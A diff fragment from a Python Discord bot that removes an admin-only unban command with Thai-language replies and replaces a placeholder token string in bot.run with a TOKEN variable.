-async def unban_cmd(ctx, member: discord.Member = None):
-  if ctx.author.id != ADMIN_ID:
-    await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
-    return
-  if not member:
-    await ctx.send("❌ กรุณา @User ที่ต้องการปลดแบน")
-    return
-
-  data = load_data()
-  bans = data.setdefault("bans", [])
-  if member.id in bans:
-    bans.remove(member.id)
-    save_data(data)
-    await ctx.send(f"✅ ปลดแบน {member.mention} สำเร็จ")
-  else:
-    await ctx.send(f"⚠️ ผู้ใช้นี้ไม่ได้โดนแบน")
-
-
-bot.run("YOUR_DISCORD_BOT_TOKEN")
+bot.run(TOKEN)
